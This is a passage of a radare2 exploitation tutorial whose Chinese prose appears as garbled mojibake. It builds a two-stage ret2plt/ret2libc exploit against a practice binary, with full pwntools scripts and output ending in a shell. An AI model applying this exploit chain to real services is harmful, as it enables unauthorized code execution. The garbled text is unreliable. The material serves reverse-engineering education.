pattern&lt;truncated&gt; -r show raw bytes instead of hexpairs&lt;truncated&gt; $ ragg2 -P 100 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºé€šè¿‡è¾“å…¥æµè¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯ä»shellä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚æ•…æˆ‘ä»¬å°†ä¼šä½¿ç”¨åˆä¸€ä¸ªæ¥è‡ªradare2å·¥å…·ç®±ä¸­çš„å·¥å…·ï¼Œrarun2ã€‚ rarun2å¯ä»¥åœ¨ä¸åŒç¯å¢ƒã€å‚æ•°ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å¤¹ä¸‹è¿è¡Œç¨‹åºï¼Œå¹¶ä¸”è¦†ç›–é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚stdinï¼‰ å¦‚æœä½ éœ€è¦åœ¨è·‘ä¸€ä¸ªç¨‹åºæ—¶ä½¿ç”¨å¾ˆé•¿çš„å‚æ•°ï¼Œå®ƒä¼šèµ·å¾ˆå¤§çš„ä½œç”¨ã€‚è€Œä¸”æ¼æ´åˆ©ç”¨é€šå¸¸éƒ½ä¼šå‘è¾“å…¥æµä¼ ä¸€å¤§å †æ•°æ®ã€‚ æˆ‘ä»¬éœ€è¦åšä»¥ä¸‹çš„ä¸‰ä¸ªæ­¥éª¤ï¼š ä½¿ç”¨ragg2å°†å¾·å¸ƒé²å› åºåˆ—å†™å…¥ä¸€ä¸ªæ–‡ä»¶ æ–°å»ºä¸€ä¸ªrarun2é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºstdin è®©radare2æ¥æ‰¾åˆ°åç§» 12345678910111213141516171819202122232425262728$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txtAAABAACAADAAEAAFAAGAAHAAIâ€¦ &lt;truncated&gt; â€¦7AA8AA9AA0ABBABCABDABEABFA $ vim profile.rr2 $ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt $ r2 -r profile.rr2 -d megabeets_0x2Process with PID 21663 startedâ€¦= attach 21663 21663bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32 â€” Use rarun2 to launch your programs with a predefined environment.[0xf77c2b30]&gt; dcSelecting and continuing: 21663 .:: Megabeets ::. Show me what you got?child stopped with signal 11 [0x41417641]&gt; æˆ‘ä»¬è¿è¡Œç¨‹åºï¼Œå¹¶å°†pattern.txtçš„å†…å®¹ç”¨rarun2ä¼ ç»™stdinï¼ŒSIGSEV 11ã€‚ ä¸€ä¸ªä¿¡å·æ˜¯ä¸€ç§å‘é€ç»™è¿›ç¨‹æˆ–æ˜¯ä¸€ä¸ªå…·ä½“çº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œè¿™æ ·ä¸ä¹‹ç›¸åŒçš„è¿›ç¨‹å°±ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å¾—åˆ°æé†’ã€‚ SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åœ¨è®¿é—®äº†æŸä¸ªæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜æˆ–æ®µé”™è¯¯åä¼šè§¦å‘ã€‚ ä½ å‘ç°äº†å—ï¼Ÿæˆ‘ä»¬å®æ—¶çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘äº†0x41417641ã€‚è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†å­—ç¬¦ä¸²AvAAï¼ˆå°ç«¯åºåŠasciiç è½¬æ¢ï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚radare2å…è®¸æˆ‘ä»¬æ‰¾åˆ°ç»™å‡ºçš„å€¼åœ¨å¾·å¸ƒé²å› åºåˆ—ä¸­çš„åç§»ã€‚ 123456[0x41417641]&gt; wop?|Usage: wop[DO] len @ addr | value| wopD len [@ addr] Write a De Bruijn Pattern of length â€˜lenâ€™ at address â€˜addrâ€™| wopO value Finds the given value into a De Bruijn Pattern at current offset[0x41417641]&gt; wopO `dr eip`140 æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“éœ€è¦è¦†ç›–è¿”å›åœ°å€çš„åç§»ä¸º140ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹ç¼–å†™è„šæœ¬äº†ã€‚ ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬æˆ‘ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œè¿™ç¯‡æ–‡ç« ä¸æ˜¯æ•™ä¸€äº›æ¼æ´åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†çš„ï¼Œå®ƒçš„ç›®çš„æ˜¯å±•ç¤ºradare2åœ¨æ¼æ´åˆ©ç”¨ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šè¿‡å¤šåœ°è§£é‡Šè„šæœ¬çš„æ¯ä¸ªéƒ¨åˆ†ã€‚ æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸­äº§ç”Ÿä¸€ä¸ªshellã€‚è¿™æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå°¤å…¶æ˜¯è¿™æ ·ä¸€ä¸ªç¨‹åºã€‚ä¸ºäº†çŸ¥é“æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚æˆ‘ä»¬çš„ç¨‹åºåœ¨å¼€äº†ASLRåœ°ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½çŒœæµ‹åˆ°libcåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚é‚£å°±å¯ä»¥å’Œret2libcè¯´å†è§äº†ã€‚å¦å¤–ï¼Œç¨‹åºå¼€äº†NXï¼Œè¿™æ„å‘³æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ªshellcodeç„¶åè·³è¿‡å»ã€‚ è™½ç„¶è¿™äº›ä¿æŠ¤è®©æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ä¸€äº›æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç„¶è€Œè¿™ä¸èƒ½é˜»æ­¢æˆ‘ä»¬è½»æ¾åœ°ç»•è¿‡å®ƒä»¬ã€‚ç¼–å†™æˆ‘ä»¬çš„è„šæœ¬æ—¶ï¼Œéœ€è¦ç»†å¿ƒåœ°è§‚å¯Ÿæä¾›ç»™æˆ‘ä»¬çš„è¿è¡Œåº“ä»¥åŠå‡½æ•°ã€‚ è®©æˆ‘ä»¬å†æ¬¡é€šè¿‡è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼Œç„¶åçœ‹ä¸€çœ‹å®ƒä½¿ç”¨çš„è¿è¡Œåº“å’Œå‡½æ•°ã€‚å…ˆçœ‹åº“ï¼š 123456789101112$ r2 -d megabeets_0x2Process with PID 23072 startedâ€¦= attach 23072 23072bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32â€” You haxor! Me jane?[0xf7763b30]&gt; il[Linked libraries]libc.so.61 library ilè¡¨ç¤ºInformation librariesï¼Œå³å‘Šè¯‰æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„è¿è¡Œåº“ã€‚å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œåªæœ‰æˆ‘ä»¬æœ€çˆ±çš„libcã€‚ ç°åœ¨é€šè¿‡æ‰§è¡Œiiå‘½ä»¤â€”â€”Information Importsï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¯¼å…¥çš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Šqæ¥å‡å°‘å†—é•¿çš„è¾“å‡ºï¼š 12345678910111213141516[0xf7763b30]&gt; ii[Imports]ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmpordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpyordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=putsordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_mainordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports[0xf7763b30]&gt; iiqstrcmpstrcpyputs__gmon_start____libc_start_main__isoc99_scanf è®¡åˆ’ æ³„æ¼putsçš„çœŸå®åœ°å€ è®¡ç®—libcçš„åŸºå€ è®¡ç®—systemçš„åœ°å€ åœ¨libcä¸­æ‰¾åˆ°åŒ…å«å­—ç¬¦ä¸²/bin/shçš„åœ°å€ è°ƒç”¨system(&quot;/bin/sh&quot;)æ‰“å¼€ä¸€ä¸ªshell æ³„æ¼putsçš„åœ°å€æˆ‘ä»¬éœ€è¦ç”¨åˆ°ret2pltæ¥æ³„æ¼putsçš„çœŸå®åœ°å€ã€‚PLTï¼ˆProcedure Linkage Tableï¼‰æ˜¯å†…å­˜ä¸­çš„ç»“æ„ä½“ï¼Œå®ƒåŒ…æ‹¬ä¸€å°æ®µä»£ç ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¨‹åºä¹‹å¤–çš„å‡½æ•°åœ°å€ã€‚ä¸ç®¡ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨.textæ®µçœ‹åˆ°CALLæŒ‡ä»¤ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³åˆ°å‡½æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒè·³è½¬åˆ°äº†PLTä¸­çš„ä¸€å°æ®µä»£ç ï¼Œåƒæ˜¯func_name@pltè¿™æ ·ã€‚è¿™ä¸€å°æ®µä»£ç è·³è½¬åˆ°GOTï¼ˆGlobal Offset Tableï¼‰ä¸­çš„åˆ—å‡ºçš„è¯¥å‡½æ•°çš„åœ°å€ã€‚GOTè¡¨å…¥å£ç‚¹ä¼šæŒ‡å›PLTï¼ŒåŒæ—¶PLTä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨æ¥ç¡®å®šè¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨func_name@pltæ—¶ï¼Œè¿™æ®µä»£ç ä¼šç›´æ¥è·³è½¬åˆ°GOTè¡¨é‡Œçš„å‡½æ•°åœ°å€ã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äºåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èä¼Šæ©å…°æ–¯æ³°å‹’å†™çš„è¿™ä¸€ç³»åˆ—å…³äºé“¾æ¥å™¨çš„æ–‡ç«  ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°putsåœ¨PLTä»¥åŠGOTä¸­çš„åœ°å€ï¼Œç„¶åè°ƒç”¨puts@pltå¹¶ä¸”æŠŠputs@gotä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠè¿™äº›è°ƒç”¨è¿åœ¨ä¸€èµ·ï¼Œåœ¨scanfæ—¶ä¼ ç»™ç¨‹åºã€‚ç„¶åæˆ‘ä»¬ä¼šè¿”å›åˆ°æˆ‘ä»¬åˆ©ç”¨çš„ç¬¬äºŒä¸ªé˜¶æ®µã€‚putså°†ä¼šæŠŠå®ƒçœŸå®çš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚ 12345678+---------------------+| Stage 1 |+---------------------+| padding (140 bytes) || puts@plt || entry_point || puts@got |+---------------------+ ç¼–å†™è„šæœ¬æˆ‘ä»¬éœ€è¦ä½¿ç”¨pwnlibæ¡†æ¶ï¼Œè€Œä¸”å®ƒæ˜¯æˆ‘æœ€å–œæ¬¢çš„pythonæ¼æ´åˆ©ç”¨æ¡†æ¶ã€‚ä»–ç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®©åˆ©ç”¨æ›´ç®€ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ã€‚ ä½¿ç”¨pipä¸‹è½½pwntoolsï¼š 12$ pip install --upgrade pip$ pip install --upgrade pwntools ä½ å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸Šäº†è§£æ›´å¤šå…³äºpwntoolsã€‚ è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„pythonè„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536from pwn import * # Addressesputs_plt =puts_got =entry_point = # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 # padding ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() if __name__ == \"__main__\": main() æˆ‘ä»¬éœ€è¦å¡«å……puts@pltå’Œputs@gotçš„åœ°å€ï¼Œä»¥åŠç¨‹åºçš„å…¥å£ç‚¹ã€‚è®©æˆ‘ä»¬å›åˆ°radare2å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚å­—ç¬¦#ç”¨äºæ³¨é‡Šï¼Œå­—ç¬¦~æ˜¯radare2çš„shellä¸­çš„å†…ç½®grepã€‚ 123456789[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts0x08048390[0xf7763b30]&gt; # the address of puts@got:[0xf7763b30]&gt; ?v reloc.puts_200x0804a014[0xf7763b30]&gt; # the address of programâ€™s entry point (entry0):[0xf7763b30]&gt; ieq0x080483d0 sym.imp.putså’Œreloc.puts_20æ˜¯radare2è‡ªåŠ¨æ£€æµ‹åˆ°çš„æ ‡å¿—ã€‚å‘½ä»¤ieè¡¨ç¤ºInformation Entrypointã€‚ ç°åœ¨æˆ‘ä»¬å¡«å…¥æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€ï¼š 12345678... # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 ... æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š 1234567891011121314$ python exploit.py[+] Starting local process â€˜./megabeets_0x2â€™: pid 23578[*] puts is at: 0xf75db710[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23578) $ python exploit.py[+] Starting local process â€˜./megabeets_0x2â€™: pid 23592[*] puts is at: 0xf7563710[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23592) $ python exploit.py[+] Starting local process â€˜./megabeets_0x2â€™: pid 23606[*] puts is at: 0xf75e3710[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23606) æˆ‘æ‰§è¡Œäº†è„šæœ¬ä¸‰æ¬¡ï¼Œputsçš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜å¾—ä¸ä¸€æ ·ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½æå‰é¢„æµ‹å®ƒçš„åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°putsåœ¨libcä¸­çš„åç§»ï¼Œç„¶åè®¡ç®—å‡ºlibcçš„åŸºå€ã€‚åœ¨æˆ‘ä»¬æ‰¾åˆ°åŸºå€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åç§»è®¡ç®—å‡ºsystemã€exitä»¥åŠå­—ç¬¦ä¸²/bin/shçš„åœ°å€ã€‚ ç°åœ¨æˆ‘ä»¬çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import * # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 # Offsetsoffset_puts = offset_system = offset_str_bin_sh = offset_exit = # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system binsh_addr = libc_base + offset_str_bin_sh exit_addr = libc_base + offset_exit log.info(\"system: 0x%x\" % system_addr) log.info(\"binsh: 0x%x\" % binsh_addr) log.info(\"exit: 0x%x\" % exit_addr) if __name__ == \"__main__\": main() è®¡ç®—çœŸå®åœ°å€è¯·æ³¨æ„åœ¨æ–‡ç« çš„è¿™éƒ¨åˆ†ï¼Œæˆ‘çš„ç»“æœå¯èƒ½ä¸ä½ çš„ä¸åŒã€‚å› ä¸ºæˆ‘ä»¬çš„libcç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸åŒçš„åç§»ã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°putsåœ¨libcä¸Šçš„åç§»ã€‚æˆ‘ä»¬å†ä¸€æ¬¡æ‰“å¼€radare2ï¼Œç»§ç»­æ‰§è¡Œåˆ°å…¥å£ç‚¹ã€‚åšä»¥ä¸Šæ­¥éª¤çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨libcè½½å…¥ä¹‹å‰å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œç›´åˆ°å…¥å£ç‚¹æ—¶ï¼Œè¿è¡Œåº“æ‰å…¨éƒ¨åŠ è½½å®Œã€‚ æˆ‘ä»¬ä½¿ç”¨dmiå‘½ä»¤ï¼Œå°†libcå’Œå‡½æ•°ä½œä¸ºå‚æ•°ã€‚æˆ‘åŠ ä¸Šäº†~æ¥æ˜¾ç¤ºç›¸å…³çš„ä¿¡æ¯ã€‚ 123456789101112131415161718192021$ r2 -d megabeets_0x2Process with PID 24124 startedâ€¦= attach 24124 24124bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32â€” A C program is like a fast dance on a newly waxed dance floor by people carrying razors â€“ Waldi Ravens[0xf771ab30]&gt; dcu entry0Continue until 0x080483d0 using 1 bpsizehit breakpoint at: 80483d0[0x080483d0]&gt; dmi libc puts~ puts$vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts[0x080483d0]&gt; dmi libc system~ system$vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system[0x080483d0]&gt; dmi libc exit~ exit$vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit è¯·æ³¨æ„ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å‘è¡¨å‰ï¼Œdmiçš„è¾“å‡ºæ ¼å¼å°±å·²ç»æ”¹å˜äº†ã€‚ä½ çš„ç»“æœå¾ˆæœ‰å¯èƒ½ä¸æˆ‘çš„æœ‰æ‰€ä¸åŒã€‚ æ‰€æœ‰è¿™äº›paddr=0x000xxxxxæ˜¯å‡½æ•°åœ¨libcä¸Šçš„åç§»ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°/bin/shçš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¦ä½¿ç”¨radare2çš„ä¸€äº›æœç´¢åŠŸèƒ½ã€‚radare2é»˜è®¤åœ¨dbg.mapï¼Œä¹Ÿå°±æ˜¯å½“å‰å†…å­˜ä¸­æŸ¥æ‰¾ã€‚æˆ‘ä»¬æƒ³è¦åœ¨æ‰€æœ‰å†…å­˜ä¸­æŸ¥æ‰¾åˆ™éœ€è¦è®¾ç½®æˆï¼š 1[0x080483d0]&gt; e search.in = dbg.maps ä½ å¯ä»¥æ‰§è¡Œe search.in=?æŸ¥çœ‹æ›´å¤šé€‰é¡¹ã€‚æ‰§è¡ŒVeé…ç½®å¯è§†åŒ–æ¨¡å¼ åœ¨radare2ä¸­é€šè¿‡/å‘½ä»¤æŸ¥æ‰¾ã€‚è®©æˆ‘ä»¬çœ‹çœ‹radare2ç»™æˆ‘ä»¬æä¾›çš„æŸ¥æ‰¾å‚æ•°ï¼š 123456789101112131415161718192021222324252627282930313233|Usage: /[amx/] [arg]Search stuff (see â€˜e??searchâ€™ for options)| / foo\\x00 search for string â€˜foo\\0â€™| /j foo\\x00 search for string â€˜foo\\0â€™ (json output)| /! ff search for first occurrence not matching| /+ /bin/sh construct the string with chunks| /!x 00 inverse hexa search (find first byte != 0x00)| // repeat last search| /h[t] [hash] [len] find block matching this hash. See /#?| /a jmp eax assemble opcode and search its bytes| /A jmp find analyzed instructions of this type (/A? for help)| /b search backwards| /B search recognized RBin headers| /c jmp [esp] search for asm code| /C[ar] search for crypto materials| /d 101112 search for a deltified sequence of bytes| /e /E.F/i match regular expression| /E esil-expr offset matching given esil expressions %%= here| /f file [off] [sz] search contents of file with offset and size| /i foo search for string â€˜fooâ€™ ignoring case| /m magicfile search for matching magic file (use blocksize)| /o show offset of previous instruction| /p patternsize search for pattern of given size| /P patternsize search similar blocks| /r[e] sym.printf analyze opcode reference an offset (/re for esil)| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated| /v[1248] value look for an cfg.bigendian 32bit value| /V[1248] min max look for an cfg.bigendian 32bit value in range| /w foo search for wide string â€˜f\\0o\\0o\\0â€™| /wi foo search for wide string ignoring case â€˜f\\0o\\0o\\0â€™| /x ff..33 search for hex string ignoring some nibbles| /x ff0033 search for hex string| /x ff43 ffd0 search for hexpair with mask| /z min max search for strings of given size æä¾›ç»™æˆ‘ä»¬äº†è®¸å¤šä¸åŒçš„æ–¹å¼ã€‚åŒæ—¶è¿˜å‘å¿ƒ/Rèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾ROPã€‚å¯æƒœè¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬æ²¡æœ‰æ‰“ç®—ä½¿ç”¨ROPã€‚ä½†å…¶ä»–æƒ…å†µä¸‹ï¼Œä½ ä»¬å†™åˆ©ç”¨è„šæœ¬æ—¶ä¸€å®šå¾ˆå–œæ¬¢ç”¨å®ƒã€‚ æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•èŠ±å“¨çš„ä¸œè¥¿ï¼Œåªç”¨æœ€ç®€å•çš„æŸ¥æ‰¾å³å¯ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°å½“å‰libcè½½å…¥çš„åœ°å€ï¼Œç„¶åè®¡ç®—å‡º/bin/shçš„åç§»ã€‚ 12345678910[0x080483d0]&gt; / /bin/shSearching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68Searching 7 bytes in [0x8048000-0x8049000]hits: 0Searching 7 bytes in [0x8049000-0x804a000]hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]hits: 0Searching 7 bytes in [0xffd2f000-0xffd50000]hits: 00xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica. r2åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†/bin/shã€‚ç°åœ¨æˆ‘ä»¬è®¡ç®—å®ƒç›¸å¯¹libcåŸºå€çš„åç§»ï¼š 1234[0x080483d0]&gt; dmm~libc0xf7599000 /usr/lib32/libc-2.25.so[0x080483d0]&gt; ?X 0xf7700768-0xf7599000167768 æˆ‘ä»¬å‘ç°/bin/shç›¸å¯¹libcåŸºå€çš„åç§»ä¸º0x167768ã€‚æˆ‘ä»¬æŠŠå®ƒå¡«è¿›è„šæœ¬ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚ 123456789...# Offsetsoffset_puts = 0x00062710 offset_system = 0x0003c060 offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768 ... è·å–shellæ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µå¾ˆç›´æ¥ã€‚æˆ‘ä»¬ç»§ç»­ä½¿ç”¨140ä¸ªå­—ç¬¦ï¼Œç„¶åè°ƒç”¨systemå¹¶å°†/bin/shä½œä¸ºå‚æ•°ï¼Œæœ€åexitã€‚ 12345678+---------------------+| Stage 2 |+---------------------+| padding (140 bytes) || system@libc || exit@libc || /bin/sh address |+---------------------+ è¿˜è®°å¾—ä¸Šä¸€æ¬¡æˆ‘ä»¬è¿”å›åˆ°äº†å…¥å£ç‚¹å—ï¼Ÿè¿™æ„å‘³ç€scanfåˆåœ¨ç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æŠŠè¿™äº›è°ƒç”¨ä¸²è”èµ·æ¥ä¼ ç»™ç¨‹åºã€‚ è¿™æ˜¯æˆ‘ä»¬æœ€åçš„è„šæœ¬ã€‚åƒæˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä½ åªéœ€è¦æ›¿æ¢ç¬¦åˆä½ çš„libcçš„åç§»ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import * # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 # Offsetsoffset_puts = 0x00062710 offset_system = 0x0003c060 offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768 # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system exit_addr = libc_base + offset_exit binsh_addr = libc_base + offset_str_bin_sh log.info(\"system is at: 0x%x\" % system_addr) log.info(\"/bin/sh is at: 0x%x\" % binsh_addr) log.info(\"exit is at: 0x%x\" % exit_addr) # Build 2nd payload payload2 = \"A\"*140 ropchain2 = p32(system_addr) ropchain2 += p32(exit_addr) # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5) # Then you'll execute system(\"sh\") ropchain2 += p32(binsh_addr) payload2 = payload2 + ropchain2 p.sendline(payload2) log.success(\"Here comes the shell!\") p.clean() p.interactive() if __name__ == \"__main__\": main() è·‘è¿™ä¸ªè„šæœ¬æˆ‘ä»¬å°±èƒ½æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellï¼š 1234567891011121314$ python exploit.py[+] Starting local process â€˜./megabeets_0x2â€™: pid 24410[*] puts is at: 0xf75db710[*] libc base: 0xf75ce000[*] system is at: 0xf760a060[*] /bin/sh is at: 0xf7735768[*] exit is at: 0xf75fd1b0[+] Here comes the shell![*] Switching to interactive mode: $ whoamibeet$ echo EOFEOF åè®°Radare2ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†å°±åˆ°æ­¤ç»“æŸäº†ã€‚æˆ‘ä»¬ç®€å•åœ°å­¦ä¹ äº†ä¸€äº›radare2ä¸­æ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šå­¦ä¹ radare2å†è„šæœ¬ç¼–å†™å’Œæ¶æ„è½¯ä»¶åˆ†æä¸­çš„åŠŸèƒ½ã€‚ æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨è¿™æ˜¯ä¸€ç³»åˆ—æˆ‘åœ¨æœ¬æ–‡ä¸­æåˆ°çš„å‘½ä»¤ï¼ˆè¿˜æœ‰ä¸€äº›è¡¥å……ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒä½œä¸ºä¸€ä»½å‚è€ƒè¡¨ã€‚ è·å–ä¿¡æ¯ $ rabin2 -I ./programâ€”â€”äºŒè¿›åˆ¶ä¿¡æ¯ï¼ˆå’Œradare2çš„shellä¸­iå‘½ä»¤ç›¸åŒï¼‰ ii [q]â€”â€”å¯¼å…¥è¡¨ ?v sym.imp.func_nameâ€”â€”è·å–func_name@PLTåœ°å€ ?v reloc.func_nameâ€”â€”è·å–func_name@GOTåœ°å€ ie 